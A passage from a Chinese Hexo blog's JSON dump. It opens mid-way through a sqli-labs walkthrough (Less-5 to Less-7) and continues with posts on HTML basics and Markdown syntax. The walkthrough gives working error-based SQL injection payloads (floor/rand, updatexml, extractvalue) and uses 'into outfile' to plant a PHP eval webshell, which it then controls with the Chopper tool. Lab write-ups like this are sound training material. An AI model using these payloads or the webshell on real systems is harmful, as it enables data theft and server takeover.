显然前四关使用union联合查询的方法在这关不起作用。那么我们就得换个思路了，提示指向了双查询注入，那么我们就将目光放到双查询注入上。双查询注入原理浅析我们可以先通过上面的网址简单了解双查询注入的运行原理，了解之后我们将这段floor()报错的语句摘取出来： 1and (select 1 from (select count(*),concat((查询语句),floor (rand(0)*2))x from information_schema.tables group by x)a) 这段代码就是我们解开问题的关键所在，将这段代码中的查询语句改为database()并补入域名之中，可以发现报错已经回显了当前所在的数据库名： 这时我们也许会有疑问了，为什么数据库的名字变成了“security1”呢？其实这不是因为数据库的名字变了，而是这个“1”为floor()报错语句中输出的一部分，无论输出什么都会出现这个“1”，因此数据库的实际名称仍然为“security”。 既然问题解决了，那么就进入了愉快的爆库流程了，但是当我们在获取表中的数据时，出现了这么一行： Subquery returns more than 1 row 我们页面的信息超过了一行，在我们使用了group_concat函数的情况下显示这个报错说明了这里的字符长度超过了64位。这种情况下，我们应该使用limit数来进行一个个输出： 1select concat(列名) from 数据库名.数据表名 limit 0,1 方法2用完floor()报错后，我就在想有没有其他的报错方法也能达到相同的效果呢，结果还真有：updatexml(1,concat(0x7e, 查询语句,0x7e),1)或者 extractvalue(1,concat(0x7e,查询语句,0x7e))这两句代码的具体语法可以参考下面这个链接的教程：方法2中的报错注入 这里简单介绍下这两句代码的报错原理，这两句代码的第二个参数需要设置Xpath格式的字符串，而“0x7e”，即“~”开头不符合其语法，concat()函数为字符串连接函数不符合规则，导致代码中括号内的结果以错误的形式报出，达到目的。 而这两句代码的字符串限制为32位，因此在进行爆表流程时，我们也应该使用limit函数将数据一行一行显示出来，达到同样效果。 less-6是双引号闭合，这两关考的是报错注入。 less-7输入id后，我们发现这次的返回文字多了一段“Use outfile……”，那么结合提示我们就可以判断出这题需要我们通过写入文件并注入一句话木马来对网页实现控制。 那么首先，我们也要先找到注入点。试试单引号，双引号，单引号加括号等多种形式，我们找到了答案为单引号加上两个括号。接下来，我们开始进行注入。 首先要注意的是，我们在进行outfile文件注入的时候必须要有root权限，而且要知道网站绝对路径的地址。不过由于这个靶场是我们自己搭的，因此很容易可以满足这些条件，当然，我们也可在之前的靶场中使用@@datadir指令来获得数据库的路径： 好有了绝对路径，直接动手，我们使用这段代码： 1select ... into outfile &quot;绝对路径&quot; 这段代码可以将select的内容注入进绝对路径下的一个文件，我们这里注入到一个7.php的文件下，如果没有这个文件会自动创建一个同名文件，但是这条代码不会覆盖原文件，因此写入时最好一次成功，如果要再次写入则需要更换文件名。 要特别注意的是，在复制绝对路径后，我们需要在“\\”后再加上一个“\\”或者将“\\”改成“/”，例如： 12D:\\\\phpstudy_pro\\\\WWW\\\\sqli-labs-master\\\\Less-7\\\\7.phpD:/phpstudy_pro/WWW/sqli-labs-master/Less-7/7.php 有代码基础的一定知道，“\\”代表着转义字符，而\\\\才是意味着字符“\\”。而“\\”的路径是windows系统所独有的表达方式，但“/”表达的路径是可以被windows、linux和mac等操作系统共同识别的，因此更推荐第二种表达路径的方式。 接下来我们要注入一句话木马了，php格式的一句话木马为： 1&lt;?php @eval($_POST[&#x27;chopper&#x27;]);?&gt; 其中的chopper是值，前面的POST（或者REQUEST等）用来获取这个值，这个值之后要用到，可自定义。这样我们就可以使用工具（菜刀，webshell等）进行访问了。 注入之后我们发现页面虽然报错，但是浏览本地文件，发现了这个7.php已经成功注入进文件夹中了，并且代码也已经被成功写入： 注入成功，我们就可以掏出我们的工具了，这里使用菜刀。如上，连接成功！","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"HTML基础学习","slug":"HTML基础学习","date":"2021-09-22T09:24:52.000Z","updated":"2021-11-24T09:10:17.528Z","comments":true,"path":"2021/09/22/HTML基础学习/","link":"","permalink":"http://example.com/2021/09/22/HTML%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/","excerpt":"前言由于php语言常常被嵌套在HTML中用于实现动态页面，所以在进行网页源代码阅读时我们往往能看到HTML语言。在学习php之前，先学习HTML基础，可以更好的帮助我们了解网页的布局，也能使我们阅读代码时更好的理解代码含义。","text":"前言由于php语言常常被嵌套在HTML中用于实现动态页面，所以在进行网页源代码阅读时我们往往能看到HTML语言。在学习php之前，先学习HTML基础，可以更好的帮助我们了解网页的布局，也能使我们阅读代码时更好的理解代码含义。 一、HTML语言语法1.HTML中的语法基本 HTML文件中是以标签对或标签来标记网页结构和显示资料内容的。标签对开始表现为&lt;xxx&gt;,标签结束表现为&lt;/xxx&gt;，其中还有一些标签不需要结束标签，例如&lt;br&gt;和&lt;p&gt;等，这些标签被称为空标签。 而HTML标签也是具有属性的，属性是为HTML元素所提供的说明信息。HTML的属性无先后次序之分，并且属性设置是可选的，如果不进行属性设置的话属性将会以默认值的形式被调用。下例是img图像标签格式：&lt;img src=&quot;http://www.baidu.com/img/baidu.gif&quot; height=&quot;200&quot; width=&quot;100&quot; /&gt;在上述语句中，src为路径，height为高度，width为宽度 在HTML的语法中，HTML标签名和属性都不区分大小写字母，因此，&lt;br&gt;和&lt;BR&gt;还有&lt;Br&gt;三者无任何区别。 HTML源代码中的回车与空格都不会在HTML页面中体现，因此我们需要应用格式标签进行文字排版。 2.HTML注释和所有的编程语言一样，注释不影响代码的运行，善于使用注释也是作为一个程序员应该养成的良好习惯。在HTML语言中，注释的方式比起我们常见的c语言较为特别，注释以&lt;!--开始，以--&gt;结束,举例如下： 12345678&lt;html&gt; &lt;head&gt; &lt;!--注释信息1--&gt; &lt;/head&gt; &lt;body&gt; &lt;!--注释信息2--&gt; &lt;/body&gt;&lt;/html&gt; 3.HTML字符实体有些字符串在HTML语言中具有特殊含义，比如标签中用到的”&lt;””&gt;”等等，这些字符串在HTML中就不可直接输出。而为了输出这些字符串，我们就需要应用字符实体来表示这些字符串.字符实体由”&amp;”、实体名称和”;”构成，以下列出一些常见的实体名称，在使用时要记得在其左右两边加上”&amp;”和”;”： 实体名称 输出字符串 nbsp 空格 amp &amp; lt &lt; gt &gt; quot “ 二、HTML文件结构正如编写C语言时一定需要一个主函数一样，编写HTML时也需要几个全局架构标签，这些标签将HTML代码分为了三个部分进行编写，格式如下： 123456&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 三个标签对分别为最外层标签，头部标记和文档主体标记，不同的部分起到了不同的作用，接下来我们分别介绍这三个部分。 1.最外层标签&lt;html&gt;和&lt;/html&gt;就是最外层标签，主要作用是告诉浏览器这个HTML文件的开始点与结束点。而由于HTML的不严谨性，只需要存在开始标记HTML文件就可以被浏览器解析。 2.头部标记&lt;head&gt;和&lt;/head&gt;标签为头部标记，在它们之间的文本是头信息。头信息中主要包括页面的一些描述语句，以及引入CSS和JavaScript脚本。在头信息中的标签使用量小于文档主体标记中的标签使用量，主要用来说明文件标题和整体文件的公共属性。 3.文档主体标记&lt;body&gt;和&lt;/body&gt;标签为主体标记，在他们之间的文本用来放置页面中的显示内容。网页呈现出的文字、图片、超链接等等都要在这个标记中进行声明。我们学习的php语言也会嵌套在这个部分。而&lt;body&gt;标签也有自己的属性值，可以设置其标签属性控制整个页面的风格，例如：&lt;body bgcolor=&quot;#FFFFFF&quot; text=&quot;red&quot;&gt;以上代码设置了本页面的背景颜色为黑色，字体颜色为红色 在HTML语言中，颜色即可以用英文单词表示，也可以使用RGB来表示 三、页面编辑网页有多种多样的呈现方式，网页中也含有大量元素，本版块将对最基本的文字、图片以及链接的代码进行分析。同时，由于在HTML代码的编写中，经常运用到CSS样式，想要了解CSS样式可以参考以下链接中的CSS基础教程进行学习：CSS教程 1.文字 格式标签在上文中我们提到了格式标签，格式标签一般用于定义网页的布局，下图列举了常用的格式标签： 文本标签文本标签用于强调或特殊说明一些文字，下图列举了常用的文本标签： 2.图像我们常用到的图片格式一般为jpg、png和gif，这些格式的图片通过&lt;img&gt;标签插入到HTML文档中，格式如下：&lt;img src=&quot;&quot; alt=&quot;&quot; width=&quot;&quot; height=&quot;&quot; bordre=&quot;&quot; src：需要指定一个包括URL路径名在内的图片文件 alt：定义一个字符串，当鼠标悬停图片上时输出该字符串 width：设置图像宽度，单位像素 height：设置图像高度，单位像素 border：设置相框的宽度，单位像素 3.链接网页中往往有链接之间的跳转，链接文档中的指定位置被称为锚点。在HTML语言中，&lt;a&gt;标签被用于定义锚点与超链接，语法格式如下：&lt;a href=&quot;&quot; name=&quot;&quot; target=&quot;&quot;&gt;链接文字&lt;/a&gt; href：指定所链接位置的URL路径，绝对路径与相对路径均可 name：指定页面的锚点名称 target：指定打开链接所用的浏览器窗口名称，默认为在当前窗口打开 4.其他在页面呈现中还有其他的形式，例如表格、表单等。本篇博客没有对其进行具体介绍，但我们也要对其具有阅读能力，尤其是在靶场中也经常使用的表格，我们可以参考下列链接进行HTML表格学习：HTML表格教程 总结HTML主要被用来在web上发布信息以及完成简单布局，同时为了页面美观也会运用CSS。在学习php之前对web页面布局有过了解后，可以帮助我们更好地理解代码作用，使自己阅读代码没有障碍。本文总结了常见的HTML语言语法，希望能够在之后的靶场练习中起到参考作用。 资料引用：《PHP学习手册》 ——电子工业出版社","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -html","slug":"web前端-html","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-html/"}]},{"title":"关于新手写博客时的常用md语法","slug":"关于新手写博客时的常用md语法","date":"2021-09-20T14:23:26.000Z","updated":"2021-09-22T13:29:37.868Z","comments":true,"path":"2021/09/20/关于新手写博客时的常用md语法/","link":"","permalink":"http://example.com/2021/09/20/%E5%85%B3%E4%BA%8E%E6%96%B0%E6%89%8B%E5%86%99%E5%8D%9A%E5%AE%A2%E6%97%B6%E7%9A%84%E5%B8%B8%E7%94%A8md%E8%AF%AD%E6%B3%95/","excerpt":"前言：当我们搭建完github+hexo的博客进入实验室后，我们所要面对的第一个问题便是如何用markdown语法写下自己的第一篇博客。我在阅读学习markdown语法与一些网上教程说明后，总结了一些常用markdown语法供参考。 一、关于标题","text":"前言：当我们搭建完github+hexo的博客进入实验室后，我们所要面对的第一个问题便是如何用markdown语法写下自己的第一篇博客。我在阅读学习markdown语法与一些网上教程说明后，总结了一些常用markdown语法供参考。 一、关于标题 当我们需要在markdown编辑器中加入如上（一、关于标题）的大标题时，只需要在标题文字前加上“#”字键并空格。文字前最多可以加上6个“#”键，每加入一个“#”键，标题字号就会小一号，代码如下：# Title 6种标题效果展示： TitleTitleTitleTitleTitleTitle二、关于引用当我们需要对资料进行引用时，我们可以在引用资料前加入“&lt;“键表示对文字进行引用，当然引用中同样可以继续引用，事实上，引用中的文字同样支持md语法。下方代码举例：&gt;word&gt;&gt;word 三、关于文字在markdown语法中同样有字体加粗，倾斜等效果，下方直接展示几种常用的字体效果：###1.斜体*word*word ###2.加粗**word**word ###3.斜体加粗***word***word 注意： 由于会和链接的默认样式产生混淆，markdown语法中无法直接为文字添加下划线，必须使用行内html解决该问题。 需要换行时需要在文字之间空一行。 如果需要分割线则在一个空行中输入三个或以上的“—”或“***”，效果如下： 四、插入代码如果你想在你的博客中编辑一段如上文的代码行，利用好“`”字符，举例如下：如果仅输入一行代码，在代码左右两边写上一个反引号： 如果想要输入代码块的话，在代码块的上一行与下一行写上三个反引号： 五、插入列表如果想在自己的文字前加入一个加粗黑点，即无序列表（如下） 例则只需要在你的文字之前加入“*”键，“+”键或“-”键并空格，例如：* 123+ 123- 123如果需要一个有序列表，则在文字前依次输入“1. ”“2. ”等，例如：1. a2. b3. c a b c 六、插入图片在写博客时，利用图片进行说明的环节是必不可少的。在markdown语法中，插入图片的格式为：![alt](图片地址 &quot;title&quot;)其中alt是在图片下方加入的文字注释，图片地址指的是图片在网络上的地址，因此推荐使用图床上传照片。而title是图片的标题，这部分可省略。例如上文“插入代码”中的图片语法如下：![例1](http://a1.qpic.cn/psc?/V11wVkh94am2Ju/05RlWl8gsTOH*Z17MtCBzHtFtpA*CeMm5FipmaRi.dnX*JxpHe14OqWyfguXnCP3JwMhlxlKCVqeswVw7*6gPA!!/c&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=XQAiAF0AIgARADc!&amp;tl=1&amp;tm=1632150000&amp;sce=0-12-12&amp;rf=0-18.jpg) 七、插入外链外链即超链接，语法形式与插入图片较为相似：[name](链接地址 &quot;title&quot;)其中的name指超链接的显示名称，链接地址即为网址域名，而同样title指的超链接标题，可写可不写，例如：[百度](www.baidu.com)百度 八、插入表格最后要介绍的是表格，表格在一些情况下也是不可或缺的。在markdown语法中，使用“|”来分隔不同的单元格，使用“-”来分隔表头和其他行，格式如下： 123|表头|表头|表头||---|---|---||文字|文字|文字| 表头 表头 表头 文字 文字 文字 小结以上便是我整理的关于使用md语法编写时的常用语法内容，同时这也是我第一次使用md语法进行文本编辑，希望今后我们能熟练掌握更深层次的md语法，让自己的写博客能力更上一层楼。","categories":[{"name":"other","slug":"other","permalink":"http://example.com/categories/other/"}],"tags":[{"name":"-markdown -hexo","slug":"markdown-hexo","permalink":"http://example.com/tags/markdown-hexo/"}]}],"categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"},{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"},{"name":"other","slug":"other","permalink":"http://example.com/categories/other/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"},{"name":"-web -php框架","slug":"web-php框架","permalink":"http://example.com/tags/web-php%E6%A1%86%E6%9E%B6/"},{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"},{"name":"-web -加固","slug":"web-加固","permalink":"http://example.com/tags/web-%E5%8A%A0%E5%9B%BA/"},{"name":"-js -web","slug":"js-web","permalink":"http://example.com/tags/js-web/"},{"name":"-http -web","slug":"http-web","permalink":"http://example.com/tags/http-web/"},{"name":"-web -sqlite","slug":"web-sqlite","permalink":"http://example.com/tags/web-sqlite/"},{"name":"-write up -ctf -web","slug":"write-up-ctf-web","permalink":"http://example.com/tags/write-up-ctf-web/"},{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"},{"name":"-ctf -web","slug":"ctf-web","permalink":"http://example.com/tags/ctf-web/"},{"name":"-web -shell","slug":"web-shell","permalink":"http://example.com/tags/web-shell/"},{"name":"-webshell -web","slug":"webshell-web","permalink":"http://example.com/tags/webshell-web/"},{"name":"-web -nmap -ssi","slug":"web-nmap-ssi","permalink":"http://example.com/tags/web-nmap-ssi/"},{"name":"-web -XXE","slug":"web-XXE","permalink":"http://example.com/tags/web-XXE/"},{"name":"-web -ssrf","slug":"web-ssrf","permalink":"http://example.com/tags/web-ssrf/"},{"name":"-web -ssti","slug":"web-ssti","permalink":"http://example.com/tags/web-ssti/"},{"name":"-web","slug":"web","permalink":"http://example.com/tags/web/"},{"name":"-python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"-MD5 -web","slug":"MD5-web","permalink":"http://example.com/tags/MD5-web/"},{"name":"-web -XSS","slug":"web-XSS","permalink":"http://example.com/tags/web-XSS/"},{"name":"-web -CSRF","slug":"web-CSRF","permalink":"http://example.com/tags/web-CSRF/"},{"name":"-web -DVWA","slug":"web-DVWA","permalink":"http://example.com/tags/web-DVWA/"},{"name":"-web -sql","slug":"web-sql","permalink":"http://example.com/tags/web-sql/"},{"name":"-ctf -misc","slug":"ctf-misc","permalink":"http://example.com/tags/ctf-misc/"},{"name":"-web -mysql -python","slug":"web-mysql-python","permalink":"http://example.com/tags/web-mysql-python/"},{"name":"-编码","slug":"编码","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"},{"name":"-web前端 -html","slug":"web前端-html","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-html/"},{"name":"-markdown -hexo","slug":"markdown-hexo","permalink":"http://example.com/tags/markdown-hexo/"}]}